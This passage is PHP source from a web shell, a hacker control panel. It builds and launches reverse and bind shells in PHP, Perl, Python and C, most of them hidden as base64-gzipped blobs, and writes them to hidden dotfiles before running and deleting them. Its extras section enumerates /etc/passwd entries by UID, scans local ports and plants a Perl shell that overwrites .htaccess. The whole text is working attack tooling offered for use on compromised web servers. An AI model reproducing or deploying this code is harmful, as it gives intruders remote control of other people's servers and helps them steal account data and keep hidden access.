     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">fully interactive backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bc.py"> <input type="submit" value="go"><input name="shellz" type="hidden" value="pyint"><br></form>';
     echo '<font color="gray">you need to run special client first: <a href="javascript:;" onclick="showTooltip(2)" id="link"> &gt;&gt; show code &lt;&lt; </a><br>with this one you will be able to run mc, top, vim, etc</font>
     <div id="2" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">';
     echo '<br>usage: python client.py [host] [port], then input there ^^^^ your host and port.<br>do not remove whitespace!<br>if you see "TERM is not set", run command: export TERM=linux<br>';
     echo "<textarea cols=\"80\" rows=\"20\" style=\"background: black; color: gray;\">";
     echo gzinflate(base64_decode('dVLBbhoxFLzvV0ypUHcly5BWvaDmEKVEQm1BKhv1sEFou/sAKxsb2U4Ifx8/mySEKAfWsj0zb2bM58G9s4P/Sg9IP2C79xujM3W3NdbDmeaWvMDW7wU8fxx11IQTt3cCxmVqhY50zntZ2/UDCvzAt1GGrVXao3ft6jWN0HeoNsb5BSoWXvTQxyupGi5QZNQ5CkSG4RzO2yPAGQMQPZ0jCB9dfY1X7JRZ0bBMS/68vbhaTqbjUjzv57PLX8t5+Xd88Ye53u7D3HgpQw9tjpxNiDivYES665TznPU7H9FjQ1vPvEPSy1p/8WA+Pt3oXsZ9SUfe1rucC5Tz8udkurya/B5PZ6yw26iOUNp7OlL5Vyuv9BorY0POxtzxxuhQ4KjvpJQ3NlZ35C9w84b9CdRta4tDC7Ju2GBevGrPboNA3yWJ2C8TYr63XmAFdgLEUvG9ZVpyVIij5CrAtckL8T7ZQqCKvyiM8Ad5SwmxYOMUtDU/p3HSUh1aP5U+Gw6HSYQxO6s8vTQ5uy4PA0WUSbAwTBvPB2nAy9t0isLadMZRi8ZoHdIoo0MVCUePKlXFEu8ifej4FPmB59NgyfAT'));
     echo "</textarea><br>";
     echo '</div><br><br>';
    }
   }
   //python end
   echo "<br>";
   echo '<font color="blue">---> C </font><br>';
   if (is_null(search("gcc",$failflag))) {
    echo "fail, no gcc here<br>";
   } else {
     if (search("gcc",$failflag)=="perm") {
      echo "fail, bad permissions<br>";
     } else {
      echo '<font color="gray">don\'t remove ".c" file extension! compiler= '.search("gcc",$failflag).'</font><br>';
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bd.c"><input type="submit" value="go"><input name="shellz" type="hidden" value="clocal"> ';
      if (is_writable("./")) {
       echo "<font color=\"green\">(./ writable)</font>";
      } else {
       echo "<font color=\"red\">(./ readonly)</font>";
      }
      echo '<br>'.$semi.'</form>';
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bc.c"><input type="submit" value="go"><input name="shellz" type="hidden" value="cremote"><br>'.$nc.'</form>';
    }
   }
   //c end
   echo "<br>";
   echo '<font color="blue">---> PHP+C findsock </font><font color="gray">(will not work on modern php/apache)</font><br>';
   if (is_null(search("gcc",$failflag))) {
    echo "fail, no gcc here<br>";
   } else {
     if (search("gcc",$failflag)=="perm") {
      echo "fail, bad permissions<br>";
     } else {
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">save and compile file: <input type="submit" value="go"><input name="shellz" type="hidden" value="findsock"><br></form>';
      echo "first save and compile findsock binary, then connect to this shell via nc: <br><br><font color=\"gray\">h4x0r@localhost$ nc -v ".$_SERVER['SERVER_NAME']." 80 <br> GET ".$_SERVER['SCRIPT_NAME']."?pfs HTTP/1.1 <br> Host:".$_SERVER['SERVER_NAME']."<br><br> sh-3.2$ id <br> uid=80(apache) gid=80(apache) groups=80(apache)</font>";
     }
   }
  } //failcheck end
  if (!empty($_POST["shellz"])) {
   //code by security-teams.net. license unknown, assuming WTFPL
   $perlbdcode='#!'.search("perl",$failflag).'
   use IO::Socket::INET;
   $server = IO::Socket::INET->new(
   LocalPort => '.$_POST["port"].',';
   $perlbdcode.=gzinflate(base64_decode('bY/RCoIwFIbve4rjiJhhSNemEGYQpYIadBFE6RFHpuKsiPDdc6ZB1C7G9n3/OdsBECt4FNgeQDfAd831wQ88a24rgzf18Mqx99OebhivMPtU2fOd6TrOW8qQlxAxpGR5ZClG0j4jsibcPWnudCyioMOQY3nDcmIcwxCLisqyyDzbJiymUpyX5w52FPKiedQPFitHASCzkehEtG/nbgMFiPHXWZ734/ijGeVCiXpimcqT7qtQt3uY5s30It7SevAC'));
   //code by Michael Schierl. license unknown, assuming WTFPL
   $perlbccode='#!'.search("perl",$failflag);
   $perlbccode.="\n";
   $perlbccode.=gzinflate(base64_decode('lVVtb5pQFP7OrzgaUiChFZxNVxlmru06006MspdkWRqESyVFIHDRNq3/fedeXoTGdZkm5rw859znnPuAeUZgYg2Hi9h9INQQcvQ/uxENDUG0J9bF9cyeggnHfX1wpp+fn5/2y8RiZt9e3GBK184GWv/0tK9j5mp8PZ5MTZ3ZX6yFbYrj+fX3X9pv9GfWvPJ15mtmNyI0ow7topchAewWkW2Dz3A4mV7ZIAszQtKx56VgjoA3VnloFqeUh1hvDKUxjZkvUTeRVOFTiF2C6J6FNFVQIE7BCwiIHUPInrI4IRHIM/vrTxWknkc2vYSuHyUVrLv55Y/5i3U3taafbq2Lm1alSNeJKUmGEMQuDasG9bbQREC7IqEZzpZHieM+yFIglRjM5BHjaO4TmlI2bvYtlo1OAW81d1dekCJ/qRnkoy3sy8m0Gi3Kw7AFyddO9gCaIXjEDyLiyWISeMjSj9P2AeQxoBD4wPL/RiNQ7rCkAs9YSly528uWQdRz7gmlT3AcwXEIPRZZOtkK3r0faBqU2896bFVd3rBV/H+1VWkN/NDCwKjt9kcHWjSnN4QdlJ96s9Y3G1c7Gh1eboW6ms/fQIlJgitk94x2GkSmuGU/BH+YvjY4BAurfhCSKMaVJ4qqK2DqB3Ls+SmygOmMhMSlwKPY+8Xcx8rjmqFinCoo4gUH2Yp4Joojy5fsjrdO6nkOdfBO108gi34ar1WRxuy4j3eGsF0hDVlndy6mGwzi45USxyuRIC5z31fxXdEfoL5DJ+OKkju1mtKNAkdHuBUwTShfI0pDbSz/SmX8IBMfGHiGmjMfH9gBxq5khfu5p6uCAow4fk9ymwaUyDhJzbEJV0o9v00T+0Xkkankr3zriUvSrw7BLWc0lQsGmsqrTWAa2PFvMUhnPyafIfLjPGITF9eIveOcmlwVIG65veU24TZhNhYQdmJBrKBU9cHXvI6pxnUzyamFtPYz1CReQRlMZRo9CN0Jbhjjn0shv8Ku5FlwZSxPuH3CJzGEPw=='));
   //author/license unknown, assuming WTFPL
   $cbdcode=gzinflate(base64_decode('bVBha8IwEP3eX3FMmOns1H2uDoo6kDEV7ZexSejaVA9rKkkUq+y/75q6Drd9CHl59y737jVQxtk+EdDTJsG8vX50Gj8UrmSU/eIK3THFTui/tM7jjTDXvBQG6XRQljxKA6TiidCeBXGGFVBxdWdCEhDqIBTfYeIBKUrgO9qofWzbN1GSKI7S6nj58OG/MrUKaSqBHb2NiGUlitSKBsbrSMEd4cPb0nXOYEXoO2muGPa7PvZKnY+tlgtnZyu2Whhm5bj0mu/HbtOjsWT5m3Rd3/m0VuNdUZHdpXdDAWgTmRuqXraHPlRpseCJjyej0IPFdPDMF+F8FLx4MJ7N5tNwysPBzKXlMAVWd/bh/sEFRxzRMEJU/jgJlTNWrePCbZ0LRYknkaesZkqH9aOtUfI02mJWkKGLkzLLK0EF7EWqtcllxsaTYDic82DySv99AQ=='));
   $cbdcode.='serv_addr.sin_port = htons('.$_POST["port"].');';
   $cbdcode.="\n";
   $cbdcode.=gzinflate(base64_decode('hVJBasMwELznFVsfilRUEgd6cnNOcymF0rNxpbUtImwjKWloyd+7suzGaQjBIHtn2PHMINfK3EpYwaduFHM0KXQCmPN2Jz0QsC2UsvDA4d6h3edhEuD0N7Yl+0M4z2a6hF6A5O5WsOAww4P27DHlGfRk2dot42fkInAOfVfZjtE3DbpqCsPeN+uXjzcB9M4369ebEmMMo53H5hTk6bqxfvGr1gaBpRx+oorBhmSGfNJobHxMmPU0IUQXUmLnb9Q1WRZUXtSe2AlSz//sEJZ3WtEvKipFKxb7sXu0Ax4bGOqYMDEZhVC7bjnqi170DEkvkCV5wgNKw5I53YK5qxORhIPJughRBmetw3EnACfTxwt2dqTnFw=='));
   //author/license unknown, assuming WTFPL
   $cbccode=gzinflate(base64_decode('XVBNawIxEL3nVwwrlESjq161BRELUqui25Msy5pku6FrIkksVfG/N7vWj3oYMvPmzZuXqUnFih0X0LeOS93KX1DtBu1taDX7Eu4/roSTPkKpSlwqB5tUKlwmqflkFFieGqj7/HsVE3SsKBnvIevMjjkoNVPOTSIVWKl6iKdioxXu0DbxJC/rI8nSjSz28AyD12Q8HUW3zlYb5/HcaWVx6rTE1apuTO7GywUtWz2eW/qt8jO1E5MeoPVBGH0BqDdXCHXtNzqNe6QSB5RxL3a+Cf7zRWE5G74ly2gxGrxTGM/ni1k0S6LhnICfkBlgzLRSgjmccQr44QpQJ/DkHVN/i4PQ2WOfENJvEziirTBGGxysmjFcBEngvyx+pMPl6U6I77bdaktZXovOfdGtJgQrcBCupQptHtDA5tCUAYXpx2Ti+6zQVnh2+eUT+gU='));
   // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
   $findsock=gzinflate(base64_decode('bVHbTsMwDH3vV5ghoaTr7m9s5Qsm3vY00BSadLPokipJEQPx79hhG2NCldL4+PjYPrlFWzWdNrAIhzAKrno1cbh7yG5/8ajRXUMe7fYvpnyrRmivqwlgkDJ/8c4iCTOGNsJeoQXBN+W3VQHVTvk85+BNwmeGNQhOwE0JMwZa6h9r0VsFtTX3UKPVPDpgC63z8cn25Dwz7xjFmC5fGetBzpQNUcokvJ48zy8TXHhKTSlFS3ZVBM4prf2GJvRB/Ys3jPP0AT8MafDP1YLo8tjCm72LhpqvZ+PnH26t51ntPIhal7M5hYutiTqql8ZwvZCM9fun/SnZGuOt2huqKOCO1OlkqmRfBhNm0nC2ag/i3K8Atn9jo1MiF8fZ0W54dMglqwzDMR6G9JMFzNg27pr09u2l3tHFRIKyhPFpQn4/SY12QZxU2dNESjkVHYqz1zLNa2JATbtmumunabHxZTC5DKbsZuMCG5De11SN6I1e0I469qVXwFU0UHQ+rpbLK3rYnbk/1wH+Er/O3zc='));
   //code by b374k, license unknown, assuming WTFPL
   $pybdcode="#!".search("python",$failflag)."\n";
   $pybdcode.=gzinflate(base64_decode('jVTbahsxEH3ehf0HVS/WYmdjO+2LWxlCcUioE5fYhUIIZrOrZEU2kpHkXP6+mpF8aZxCX7zS6MycMzfLp5U2jmjbI/YNfnT1KFyPOPkksvTy9PdyOrnig/7wc5bOzyfTKafHd1Id24YcVTRLFxeXk+Xs14IPhv1+lv6cXS849fbz2TwcanFPbCPallVPdT7K0sQ2S712XNtipVdCMQzb7RDa6XpIt0M7eWFEWbdSCcty76GiC8RL7rUhkkhFTKkeBGt9hPCcY/QNuMvD90beeqsRbm0UiW9BVVk5qRWrtFLo+dLIVpCFWQuMA/bCClUzOh6PCQUhiTNv+JisvFSOECOqZxYLhRjxWomVizAjlSMUqul5KdqiFiBCeGsDYQIhacB8kCQw5keDkCSCuxxsIcEkkfcEAnA6qisaQe+oPNcOZet3qLPSK4mwjSSICuTAPe5HWwK92PU0Gnf1gl5kaWkenrmfqQIOWRoDwSX/djIi3isWRxijzVfIG9DiVTo28P6oFeA3g1uv9+gO5eKAoXV4e4gxlJSq3hGNTw59EhxNvJ5gCJ8r2bIi1sticMhRth9U345Hln/iWIGtyr5/h33hYWmK8GHxdnq2vLiaLDYrVcxn338s54vryell9PPVcnEy2GaPAuVB2gj3e1cz1ml1VbaNtq7TI6gy3wBaaZ1PHXSZteKh7WGs/R3ivC/XaDPUqLKAHorKMcKgSDE82Z9qsj/WIIKslV/WqinvWhFmF1IqbCvEin3JtxMOCnhcOeCCl+2cgYIEN7FX1rXJsaJFWQEl+6+l2iMdfEyKe35QAl9eEia3Wbtavyg2PFBGYrPgr4D+VYx/sAb8fsA/'));
   //code by ont.rif, license unknown, assuming WTFPL
   $pyintserver="#!".search("python",$failflag)."\n";
   $pyintserver.="import sys, socket, os, pty, fcntl, struct, termios, select, resource\n";
   $pyintserver.="host = \"".$_POST["ip"]."\"\n";
   $pyintserver.="port = ".$_POST["port"]."\n";
   $pyintserver.=gzinflate(base64_decode('hVT9i+IwEP29f8XcgjSFXlfXdT+EPVg8lyvnKqzCwalIL41rsCYliav+9zfpl9VdsNjGJm9m3ry81KhD1wEt6RqesoGZIB9I+fr8sgiH/Ylfvo9Hvd+L8eSt//wKXh4bUCkEoxhDVlIbH1KpjIerbE9ZarBCqrgwcAW9SLgGCvi3mbhyQOpgwfYcg1sYYTJCfGmnl1KtiQc/oNmtoZq26iVAXhhG475SUvnA7FDxcMFGdqERA2lobyZcaADJQQE+hSwiAm1U9gdTYoF4m97kugRLnjAhiYeyHDTCYi6qObiMlltzhF9EI4U6uhSzoWcKnxnqgynNpXBSHvtAVzyJF8sY9zQ1h0ImBzUT0gAiuuBALjRMwlFv/Cccjv8i+J2ZyBhFDFMbLrUP7nHZ9eH7Tev27vHmsXPXwi2we1CPfgJcfmi27+/bnYFNfZq7Foxr2trNqC01QRrRNXF/4YUlbps+POBtf7bGkgqTBFxSk5CvtPNrRVAua43Kc5BGWjuwifa5FIppuVWUBdimSvgGvVJNvQ3C13CyGI5ewkHfmzbnjrUIcOACVCTeGYG2X6bybPJCP+s7mkjNgHBL+NR4GSKngTi2Z/SDgHv9j4trvcJ2p647R8473C8GE7VlGIBu3aH9rEAswVMS5AOBabWv/qlPYI6ZirtTnI7KAraBOl9sGVMjG8WimNRStpr2suFZUzvFDftkSBt9bDNvL3fjT44SZNnA8A0D3CUP7VlkOzu7p/RLimfUzkq3SnZHckfyJa/C4/j6iRvb4FkoPmJfM/sP'));
   switch ($_POST["shellz"]) {
    case "phpremote":
    // code by pentestmonkey.net. license: GPLv2
     $ip=($_POST["ip"]);
     $port=($_POST["port"]);
     $chunk_size=1400;
     $write_a=null;
     $error_a=null;
     $shell='/bin/sh -i';
     $daemon = 0;
     function printit ($string) { if (!$daemon) { print "$string\n"; }}
     if (function_exists('pcntl_fork')) {
      $pid = pcntl_fork();
      if ($pid == -1) { printit("ERROR: Can't fork<br>"); exit(1); }
      if ($pid) { exit(0); }
      if (posix_setsid() == -1) { printit("Error: Can't setsid()<br>"); exit(1); }
      $daemon = 1;
     } else { printit("WARNING: Failed to daemonise!<br>"); }
     umask(0);
     $sock = fsockopen($ip, $port, $errno, $errstr, 30);
     if (!$sock) { printit("$errstr ($errno)"); exit(1); }
     $process = proc_open($shell, $descriptorspec, $pipes);
     if (!is_resource($process)) { printit("ERROR: Can't spawn shell<br>"); exit(1); }
     stream_set_blocking($pipes[0], 0);
     stream_set_blocking($pipes[1], 0);
     stream_set_blocking($pipes[2], 0);
     stream_set_blocking($sock, 0);
     printit("Successfully opened reverse shell to $ip:$port<br>");
     while (1) {
      if (feof($sock)) { printit("ERROR: Shell connection terminated<br>");     break; }
      if (feof($pipes[1])) { printit("ERROR: Shell process terminated<br>"); break;     }
      $read_a = array($sock, $pipes[1], $pipes[2]);
      $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
      if (in_array($sock, $read_a)) {
       $input = fread($sock, $chunk_size);
       fwrite($pipes[0], $input);
      }
      if (in_array($pipes[1], $read_a)) {
       $input = fread($pipes[1], $chunk_size);
       fwrite($sock, $input);
      }
      if (in_array($pipes[2], $read_a)) {
       $input = fread($pipes[2], $chunk_size);
       fwrite($sock, $input);
      }
     }
     fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);@proc_close($process);
    //php backconnect end
    break;
    case "phplocal":
     // code by metasploit.com. license unknown, assuming BSD
     $port=$_POST["port"]; 
     $scl='socket_create_listen';
     if (function_enabled($scl)) {
      $sock=@$scl($port); 
     } else { 
      $sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      $ret=@socket_bind($sock,0,$port);
     $ret=@socket_listen($sock,5); 
     }
     $msgsock=@socket_accept($sock);
     @socket_close($sock);
     while (FALSE !== @socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL)) {
      $buffer = '';
      $c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
      if (FALSE === $c) { break; }
      if (substr($c,0,3) == 'cd ') {
       chdir(substr($c,3,-1));
      } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
       break;
      } else {
       if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) { $c=$c." 2>&1\n"; }
       if (function_enabled('shell_exec')) {
        $buffer=shell_exec($c);
       } else if(function_enabled('passthru')) {
        ob_start();
        passthru($c);
        $buffer=ob_get_contents();
        ob_end_clean();
       } else if(function_enabled('system')) {
        ob_start();
        system($c);
        $buffer=ob_get_contents();
        ob_end_clean();
       } else if(function_enabled('exec')) {
        $buffer=array();
        exec($c,$buffer);
        $buffer=join(chr(10),$buffer).chr(10);
       } else if(function_enabled('proc_open')) {
        $handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes);
        $buffer=NULL;
        while (!feof($pipes[1])) {
         $buffer.=fread($pipes[1],1024);
        }
       @proc_close($handle);     
       } else if(function_enabled('popen')) {
        $fp=popen($c,'r');
        $buffer=NULL;
        if (is_resource($fp)) { 
         while (!feof($fp)) {
          $buffer.=fread($fp,1024);
         }
        }
        @pclose($fp);
       }
      else { $buffer=0; }
      }
      @socket_write($msgsock,$buffer,strlen($buffer));
     }
     @socket_close($msgsock);
     echo "<br><br><font color=\"green\">phplocal done</font>"; 
    break;
    //phpbind end
    case "perllocal":
     $exec_path = trim($_POST['path']);
     @sploent516();
     $fh=fopen($exec_path,'w');
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else { 
      fwrite($fh,$perlbdcode);
      fclose($fh);
      chmod($exec_path,0644);
      $c=search("perl",$failflag).' '.$exec_path.' && rm -f '.$exec_path.'';
      if (function_enabled('shell_exec')) {
       shell_exec($c);
      } else if(function_enabled('passthru')) {
       passthru($c);
      } else if(function_enabled('system')) {
       system($c);
      } else if(function_enabled('exec')) {
       exec($c);
      } else if(function_enabled('proc_open')) {
       $handle=proc_open($c,$descriptorspec,$pipes);
       while (!feof($pipes[1])) {
        $buffer.=fread($pipes[1],1024);
       }
       @proc_close($handle);
      } else if(function_enabled('popen')) {
       $fp=popen($c,'r');
       @pclose($fp);
      }
      echo "<br><br><font color=\"green\">perllocal done</font>";
     }
    //perl bind end
    break;
    case "perlremote":
     $exec_path=trim($_POST['path']);
     @sploent516();
     $fh=fopen($exec_path,'w');
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else {
      fwrite($fh,$perlbccode);
      fclose($fh);
      chmod($exec_path,0644);
      $c=search("perl",$failflag).' '.$exec_path.' '.$_POST["ip"].' '.$_POST["port"].' && rm -f '.$exec_path.'';
      if (function_enabled('system')) {
       system($c);
      } else if(function_enabled('shell_exec')) {
       shell_exec($c);
      } else if(function_enabled('passthru')) {
       passthru($c);
      } else if(function_enabled('exec')) {
       exec($c);
      } else if(function_enabled('proc_open')) {
       $handle=proc_open($c,$descriptorspec,$pipes);
       while (!feof($pipes[1])) {
        $buffer.=fread($pipes[1],1024);
       }
       @proc_close($handle);
      } else if(function_enabled('popen')) {
       $fp=popen($c,'r');
       @pclose($fp);
      }
      echo "<br><br><font color=\"green\">perlremote done</font>";
     }
    break;
    //perl backconnect end
    case "pylocal":
     $exec_path = trim($_POST['path']);
     @sploent516();
     $fh=fopen($exec_path,'w');
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else { 
      fwrite($fh,$pybdcode);
      fclose($fh);
      chmod($exec_path,0644);
      $c=search("python",$failflag).' '.$exec_path.' -b '.$_POST["port"].' && rm -f '.$exec_path.'';
      if (function_enabled('shell_exec')) {
       shell_exec($c);
      } else if(function_enabled('passthru')) {
       passthru($c);
      } else if(function_enabled('system')) {
       system($c);
      } else if(function_enabled('exec')) {
       exec($c);
      } else if(function_enabled('proc_open')) {
       $handle=proc_open($c,$descriptorspec,$pipes);
       while (!feof($pipes[1])) {
        $buffer.=fread($pipes[1],1024);
       }
       @proc_close($handle);
      } else if(function_enabled('popen')) {
       $fp=popen($c,'r');
       @pclose($fp);
      }
      echo "<br><br><font color=\"green\">pylocal done</font>";
     }
    //python bind end
    case "pyremote":
     $exec_path=trim($_POST['path']);
     @sploent516();
     $fh=fopen($exec_path,'w');
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else {
      fwrite($fh,$pybdcode);
      fclose($fh);
      chmod($exec_path,0644);
      $c=search("python",$failflag).' '.$exec_path.' -r '.$_POST["port"].' '.$_POST["ip"].' && rm -f '.$exec_path.'';
      if (function_enabled('system')) {
       system($c);
      } else if(function_enabled('shell_exec')) {
       shell_exec($c);
      } else if(function_enabled('passthru')) {
       passthru($c);
      } else if(function_enabled('exec')) {
       exec($c);
      } else if(function_enabled('proc_open')) {
       $handle=proc_open($c,$descriptorspec,$pipes);
       while (!feof($pipes[1])) {
        $buffer.=fread($pipes[1],1024);
       }
       @proc_close($handle);
      } else if(function_enabled('popen')) {
       $fp=popen($c,'r');
       @pclose($fp);
      }
      echo "<br><br><font color=\"green\">pyremote done</font>";
     }
    break;
    //python backconnect end
    case "pyint":
     $exec_path=trim($_POST['path']);
     @sploent516();
     $fh=fopen($exec_path,'w');
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else {
      fwrite($fh,$pyintserver);
      fclose($fh);
      chmod($exec_path,0644);
      $c=search("python",$failflag).' '.$exec_path.' && rm -f '.$exec_path.'';
      if (function_enabled('system')) {
       system($c);
      } else if(function_enabled('shell_exec')) {
       shell_exec($c);
      } else if(function_enabled('passthru')) {
       passthru($c);
      } else if(function_enabled('exec')) {
       exec($c);
      } else if(function_enabled('proc_open')) {
       $handle=proc_open($c,$descriptorspec,$pipes);
       while (!feof($pipes[1])) {
        $buffer.=fread($pipes[1],1024);
       }
       @proc_close($handle);
      } else if(function_enabled('popen')) {
       $fp=popen($c,'r');
       @pclose($fp);
      }
      echo "<br><br><font color=\"green\">pyint done</font>";
     }
    break;
    //python interactive end
    case "clocal":
     $exec_path=trim($_POST['path']);
     @sploent516();
     $fh=fopen($exec_path,"w");
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; } 
     else {
      fwrite($fh,$cbdcode);
      fclose($fh);
      $c=search("gcc",$failflag)." -w ".$exec_path." -o ".$exec_path."1 && rm -f ".$exec_path." && ".$exec_path."1 ".$_POST["port"]." | rm -f ".$exec_path."1";
      if (function_enabled('shell_exec')) {
       shell_exec($c);
      } else if(function_enabled('passthru')) {
       passthru($c);
      } else if(function_enabled('system')) {
       system($c);
      } else if(function_enabled('exec')) {
       exec($c);
      } else if(function_enabled('proc_open')) {
       $handle=proc_open($c,$descriptorspec,$pipes);
       while (!feof($pipes[1])) {
        $buffer.=fread($pipes[1],1024);
       }
       @proc_close($handle);
      } else if(function_enabled('popen')) {
       $fp=popen($c,'r');
       @pclose($fp);
      }
      echo "<br><br><font color=\"green\">clocal done</font>";
     }
    break;
    //C bind end
    case "cremote":
     $exec_path=trim($_POST['path']);
     @sploent516();
     $fh=fopen($exec_path,"w");
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else {
      fwrite($fh,$cbccode);
      fclose($fh);
      $c=search("gcc",$failflag)." ".$exec_path." -o ".$exec_path."1 && rm -f ".$exec_path." && ".$exec_path."1 ".$_POST["ip"]." ".$_POST["port"]." | rm -f ".$exec_path."1";
      if (function_enabled('shell_exec')) {
       shell_exec($c);
      } else if(function_enabled('passthru')) {
       passthru($c);
      } else if(function_enabled('system')) {
       system($c);
      } else if(function_enabled('exec')) {
       exec($c);
      } else if(function_enabled('proc_open')) {
       $handle=proc_open($c,$descriptorspec,$pipes);
       while (!feof($pipes[1])) {
        $buffer.=fread($pipes[1],1024);
       }
       @proc_close($handle);
       } else if(function_enabled('popen')) {
       $fp=popen($c,'r');
       @pclose($fp);
      }
     }
    break;
    case "findsock":
     @sploent516();
     $fh=fopen("findsock.c","w");
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else {
      fwrite($fh,$findsock);
      fclose($fh);
      $c=search("gcc",$failflag)." findsock.c -o findsock && rm -f findsock.c";
      if (function_enabled('shell_exec')) {
       shell_exec($c);
      } else if(function_enabled('passthru')) {
       passthru($c);
      } else if(function_enabled('system')) {
       system($c);
      } else if(function_enabled('exec')) {
       exec($c);
      } else if(function_enabled('proc_open')) {
       $handle=proc_open($c,$descriptorspec,$pipes);
       while (!feof($pipes[1])) {
        $buffer.=fread($pipes[1],1024);
       }
       @proc_close($handle);
       } else if(function_enabled('popen')) {
       $fp=popen($c,'r');
       @pclose($fp);
      }
     echo "<br>saved and compiled!<br>";
     }
    break;
   }
  }
  echo "</body></html>";
  break;
// --------------------------------------------- bind end; extras 
 case "e":
  if (empty($_POST["extraz"])) {
   echo $title; 
   echo '<font color="blue">---> SysInfo</font><br>';
   echo '<font color="gray">httpd: '.getenv("SERVER_SOFTWARE").'<br>';
   echo "php API: ".php_sapi_name()."<br>";
   echo "php version: ".version()." (full: ".phpversion().")<br>";
   sploent516();
   echo "<br>";
   echo "current dir: ".getcwd()."<br>"; 
   echo "uname: ".wordwrap(php_uname(),90,"<br>",1)."<br>";
   echo "script owner: ".get_current_user()."<br>";
   if(function_enabled('posix_getpwuid')) { 
    $processUser = posix_getpwuid(posix_geteuid());
    echo "current user: ".$processUser['name']."<br>";
   } else {
    echo "posix_getpwuid disabled!<br>";
   }
   echo "<br></font>";
   echo '<font color="blue">---> Extraz</font><br><br>';
   if (!function_enabled('phpinfo')) { echo "fail, phpinfo() is disabled<br><br>"; 
   } else {
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">
     <input name="extraz" type="hidden" value="info"><input type="submit" value="phpinfo()"></form><br>';
   }
   if(function_enabled('posix_getpwuid')) {
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">"read" /etc/passwd from uid <input name="uid1" type="text" size="10" value="0"> to <input name="uid2" type="text" size="10" value="1000"> <input type="submit" value="go"><input name="uidz" type="hidden" value="done"></form>';
    if (!empty($_POST["uidz"])) {
     echo "<br>";
     //code by oRb. license unknown, assuming WTFPL
     for(;$_POST['uid1'] <= $_POST['uid2'];$_POST['uid1']++) {
      $uid = @posix_getpwuid($_POST['uid1']);
      if ($uid)
       echo join(':',$uid)."<br>\n";
     }
    }
   }
   echo "<br>";
   if(function_enabled('fsockopen')) {
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">"scan" local open ports from <input name="port1" type="text" size="5" maxlength="5" value="1"> to <input name="port2" type="text" size="5" maxlength="5" value="1337"> <input type="submit" value="go"><input name="portz" type="hidden" value="done"></form>';
    if (!empty($_POST["portz"])) {
     for($i=$_POST["port1"]; $i <= $_POST["port2"]; $i++)
     {
      $fp=@fsockopen("127.0.0.1", $i, $errno, $errstr, 1);
      if ($fp) {
       echo "-> ".$i."<br>";
       fclose($fp);
      }
     }
    }
   }
   echo '<br><form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">put mini perl shell into <input name="dir" type="text" maxlength="500" size="10" style="color: green;" value="."><font color="green">/</font><input name="file" type="text" maxlength="500" size="10" style="color: green;" value="sh.pl"> adding .htaccess <input type="checkbox" name="htaccess"> <input type="submit" value="OK"><input name="extraz" type="hidden" value="perlsh"> ';
   if (is_writable("./")) {
    echo "<font color=\"green\">(./ writable)</font>";
   } else {
    echo "<font color=\"red\">(./ readonly)</font>";
   }
   echo '<br><font color="gray">warning: my .htaccess will <b>rewrite</b> current one!(if any)</font> </form>';
   if ($failflag=="1") {
    echo "can't find perl binary (all system functions disabled) assuming /usr/bin/perl<br>";
   }
   echo '<br>';
   //code by Eric A. Meyer, license CC BY-SA
   echo '<script type="text/javascript">function encode() { var obj = document.getElementById("dencoder"); var unencoded = obj.value; obj.value = encodeURIComponent(unencoded); } function decode() { var obj = document.getElementById("dencoder"); var encoded = obj.value; obj.value = decodeURIComponent(encoded.replace(/\+/g,  " ")); } </script>';
   echo "<font color='blue'>---> Text encoderz/decoderz</font><br><br>";
   echo "fast URL-encoder:<br>";
   echo '<form onsubmit="return false;"><textarea cols="80" rows="4" style="background: black; color: gray;" id="dencoder"></textarea><div><input type="button" onclick="decode()" value="Decode"> <input type="button" onclick="encode()" value="Encode"></div></form>';
   echo "<br>other encoders: ";
   //code by Eugen, license unknown, assuming WTFPL
   $cryptform="<form action=\"".$_SERVER['PHP_SELF']."?p=e\" method=\"post\"> 
   <textarea name=\"text\" cols=\"80\" rows=\"4\" style=\"background: black; color: gray;\">";
   if(isset($_POST["text"])) { $cryptform.=$_POST["text"]; }
   $cryptform.="</textarea><br>
   <select name=\"cryptmethod\" style=\"background: black; color: gray;\"> 
   <option value=\"asc2hex\">ASCII to Hex</option> 
   <option value=\"hex2asc\">Hex to ASCII</option> 
   <option value=\"b64enc\">Base 64 Encode</option> 
